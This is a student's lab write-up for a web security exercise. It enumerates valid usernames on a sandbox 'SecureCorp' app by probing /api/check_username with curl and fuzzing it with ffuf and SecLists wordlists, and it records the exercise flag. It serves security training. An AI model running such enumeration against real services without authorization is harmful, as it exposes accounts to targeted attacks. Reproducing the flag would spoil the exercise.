# 0. User Enumeration

**Objective**:

Find valid users in the application by exploiting enumeration vulnerabilities.

Do:

- Use ffuf with SecLists wordlists
- Test the `/api/check_username` endpoint to find which users exist
- Identify which user contains the flag (the flag appears in the JSON response)

Repo:

- GitHub repository: `dlh-cyber_security`
- Directory: `web_application_security/0x0B_WEBSEC`
- File: `0-flag.txt`

## Step 0: Spin of a Sandbox

**Click**:
- `\>_ Get a Sandbox`
- New Sandbox \ Europe (Paris) \ `cyber_websec_0x0b`
- `Network Information`
> Hostname (different for each user/case)  \
> web-0-47-145.cod-eu-west-3.hbtn.io  \
> Local IP  \
> 10.42.47.145  
- `HTTP - Port 80`

- **Create User and Login**
- Explore `/dashboard` and `/directory`

Here is the *Empolee Directory* of **SecureCorp**:

| Name | Role | Department | Email |
| :--- | :--- | :--- | :--- |
| admin | Admin | IT | admin@securecorp.com |
| bob.jones | Employee | Finance | bob.jones@securecorp.com |
| ceo | Admin | Executive | ceo@securecorp.com |
| david | Employee | R&D | david@securecorp.com |
| guest | Employee | Visitor | guest@securecorp.com |
| john.doe | Employee | IT | john.doe@securecorp.com |
| linda.smith | Employee | HR | linda.smith@securecorp.com |
| michael | Employee | HR | michael@securecorp.com |
| neat | Employee | - | attila.nemet@cyber.dlh.lu |
| sarah.connor | Employee | Security | sarah.connor@securecorp.com |
| system_svc | Service | Infrastructure | no-reply@securecorp.com |


## Step 1: Understand the endpoint

Before fuzzing, probe `/api/check_username` manually to learn its shape.  \
Is it a:
- `GET` with query parameter? 
- `POST` with a JSON body?

```bash
┌──(kali㉿kali)-[~/dlh-cyber_security/web_application_security/0x0B_WEBSEC]
└─$ 
curl -s "https://web-80-47-145.cod-eu-west-3.hbtn.io/api/check_username?username=admin"
# <!doctype html>
# <html lang=en>
# <title>405 Method Not Allowed</title>
# <h1>Method Not Allowed</h1>
# <p>The method is not allowed for the requested URL.</p>


curl -s -X POST "https://web-80-47-145.cod-eu-west-3.hbtn.io/api/check_username" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin"}'

# {"available":false,
#  "debug":"TASK 1 COMPLETED! User enumerated.",
#  "flag":"66800c78ea0eb4515fd4df0aba022243",
#  "message":"Username is taken"}

```

## Step 2: Establish a Baseline

Compare response for existing and **not** existing users.

```bash
curl -s -X POST "https://web-80-47-145.cod-eu-west-3.hbtn.io/api/check_username" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin"}'

# {"available":false,
#  "debug":"TASK 1 COMPLETED! User enumerated.",
#  "flag":"66800c78ea0eb4515fd4df0aba022243",
#  "message":"Username is taken"}

curl -s -X POST "https://web-80-47-145.cod-eu-west-3.hbtn.io/api/check_username" \
  -H "Content-Type: application/json" \
  -d '{"username":"NOT-admin"}'

# {"available":true,
#  "message":"Username is available"}

```

## Step 3: Fuzz with ffuf

Check for `seclists`, install it if missing:

```bash
# ┌──(kali㉿kali)-[~/dlh-cyber_security/cybersecurity_basics/0x03_cryptography_basics]
# └─$ 
ls -l /usr/share/seclists 
# ls: cannot access '/usr/share/seclists': No such file or directory

sudo apt install seclists

 ls -l /usr/share/seclists/Usernames/Names 
total 128
-rw-r--r-- 1 root root  7119 Sep 19  2025 familynames-usa-top1000.txt
-rw-r--r-- 1 root root  6942 Sep 19  2025 femalenames-usa-top1000.txt
-rw-r--r-- 1 root root 28193 Sep 19  2025 forenames-india-top1000.txt
-rw-r--r-- 1 root root  6677 Sep 19  2025 malenames-usa-top1000.txt
-rw-r--r-- 1 root root 75127 Sep 19  2025 names.txt

```

### Best name/username lists

```bash
# ┌──(kali㉿kali)-[~/dlh-cyber_security/cybersecurity_basics/0x03_cryptography_basics]
# └─$ 

cat /usr/share/seclists/Usernames/top-usernames-shortlist.txt | wc -l 
# 17

cat /usr/share/seclists/Usernames/Names/names.txt| wc -l                          
# 10713

cat /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt | wc -l 
# 624370

cat /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt | wc -l 
# 8295455

```

### 3.1 Fuzzing with `top-usernames-shortlist.txt`

```bash
ffuf -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
-u "https://web-80-47-145.cod-eu-west-3.hbtn.io/api/check_username" \
-X POST \
-H "Content-Type: application/json" \
-d '{"username":"FUZZ"}' \
-mr "Username is taken"

#         /'___\  /'___\           /'___\       
#        /\ \__/ /\ \__/  __  __  /\ \__/       
#        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
#         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
#          \ \_\   \ \_\  \ \____/  \ \_\       
#           \/_/    \/_/   \/___/    \/_/       
# 
#        v2.1.0-dev
# ________________________________________________
# 
#  :: Method           : POST
#  :: URL              : https://web-80-47-145.cod-eu-west-3.hbtn.io/api/check_username
#  :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/top-usernames-shortlist.txt
#  :: Header           : Content-Type: application/json
#  :: Data             : {"username":"FUZZ"}
#  :: Follow redirects : false
#  :: Calibration      : false
#  :: Timeout          : 10
#  :: Threads          : 40
#  :: Matcher          : Regexp: Username is taken
# ________________________________________________
# 
# admin                   [Status: 200, Size: 137, Words: 7, Lines: 2, Duration: 729ms]
# guest                   [Status: 200, Size: 137, Words: 7, Lines: 2, Duration: 795ms]
# :: Progress: [17/17] :: Job [1/1] :: 27 req/sec :: Duration: [0:00:01] :: Errors: 0 ::

```

Users: 
- `admin`
- `guest`


### 3.2 Fuzzing with `Names/names.txt`

```bash
ffuf -w /usr/share/seclists/Usernames/Names/names.txt \
-u "https://web-80-47-145.cod-eu-west-3.hbtn.io/api/check_username" \
-X POST \
-H "Content-Type: application/json" \
-d '{"username":"FUZZ"}' \
-fs 53 \
-fc 500

#         /'___\  /'___\           /'___\       
#        /\ \__/ /\ \__/  __  __  /\ \__/       
#        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
#         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
#          \ \_\   \ \_\  \ \____/  \ \_\       
#           \/_/    \/_/   \/___/    \/_/       
# 
#        v2.1.0-dev
# ________________________________________________
# 
#  :: Method           : POST
#  :: URL              : https://web-80-47-145.cod-eu-west-3.hbtn.io/api/check_username
#  :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/Names/names.txt
#  :: Header           : Content-Type: application/json
#  :: Data             : {"username":"FUZZ"}
#  :: Follow redirects : false
#  :: Calibration      : false
#  :: Timeout          : 10
#  :: Threads          : 40
#  :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
#  :: Filter           : Response status: 500
#  :: Filter           : Response size: 53
# ________________________________________________
# 
# admin                   [Status: 200, Size: 137, Words: 7, Lines: 2, Duration: 1840ms]
# david                   [Status: 200, Size: 137, Words: 7, Lines: 2, Duration: 1855ms]
# michael                 [Status: 200, Size: 137, Words: 7, Lines: 2, Duration: 1996ms]
# :: Progress: [10713/10713] :: Job [1/1] :: 29 req/sec :: Duration: [0:06:24] :: Errors: 0 ::

```

Users:
- `admin`
- `david`
- `michael`

### 3.3 Fuzzing with `xato-net-10-million-usernames-dup.txt`

```bash
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt \ 
-u "https://web-80-47-145.cod-eu-west-3.hbtn.io/api/check_username" \
-X POST \
-H "Content-Type: application/json" \
-d '{"username":"FUZZ"}' \
-fs 53 \
-mc 200,301

#         /'___\  /'___\           /'___\       
#        /\ \__/ /\ \__/  __  __  /\ \__/       
#        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
#         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
#          \ \_\   \ \_\  \ \____/  \ \_\       
#           \/_/    \/_/   \/___/    \/_/       
# 
#        v2.1.0-dev
# ________________________________________________
# 
#  :: Method           : POST
#  :: URL              : https://web-80-47-145.cod-eu-west-3.hbtn.io/api/check_username
#  :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt
#  :: Header           : Content-Type: application/json
#  :: Data             : {"username":"FUZZ"}
#  :: Follow redirects : false
#  :: Calibration      : false
#  :: Timeout          : 10
#  :: Threads          : 40
#  :: Matcher          : Response status: 200,301
#  :: Filter           : Response size: 53
# ________________________________________________
# 
# admin                   [Status: 200, Size: 137, Words: 7, Lines: 2, Duration: 558ms]
# michael                 [Status: 200, Size: 137, Words: 7, Lines: 2, Duration: 641ms]
# david                   [Status: 200, Size: 137, Words: 7, Lines: 2, Duration: 707ms]
# guest                   [Status: 200, Size: 137, Words: 7, Lines: 2, Duration: 1760ms]
# ceo                     [Status: 200, Size: 137, Words: 7, Lines: 2, Duration: 2074ms]
# neat                    [Status: 200, Size: 137, Words: 7, Lines: 2, Duration: 2080ms]
# :: Progress: [93295/624370] :: Job [1/1] :: 28 req/sec :: Duration: [0:55:26] :: Errors: 0 ::
```

Users:
- `admin`
- `michael`
- `david`
- `guest`
- `ceo`
- `neat`


### 3.4 Users Carrying a Flag

```bash
for u in admin michael david guest ceo neat; do
echo "== $u =="
curl -s -X POST "https://web-80-47-145.cod-eu-west-3.hbtn.io/api/check_username" \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$u\"}"

echo
done

== admin ==
{"available":false,"debug":"TASK 1 COMPLETED! User enumerated.","flag":"66800c78ea0eb4515fd4df0aba022243","message":"Username is taken"}

== michael ==
{"available":false,"debug":"TASK 1 COMPLETED! User enumerated.","flag":"66800c78ea0eb4515fd4df0aba022243","message":"Username is taken"}

== david ==
{"available":false,"debug":"TASK 1 COMPLETED! User enumerated.","flag":"66800c78ea0eb4515fd4df0aba022243","message":"Username is taken"}

== guest ==
{"available":false,"debug":"TASK 1 COMPLETED! User enumerated.","flag":"66800c78ea0eb4515fd4df0aba022243","message":"Username is taken"}

== ceo ==
{"available":false,"debug":"TASK 1 COMPLETED! User enumerated.","flag":"66800c78ea0eb4515fd4df0aba022243","message":"Username is taken"}

== neat ==
{"available":false,"debug":"TASK 1 COMPLETED! User enumerated.","flag":"66800c78ea0eb4515fd4df0aba022243","message":"Username is taken"}


```

### 3.5 Store the Flag in File `0-flag.txt`

```bash

```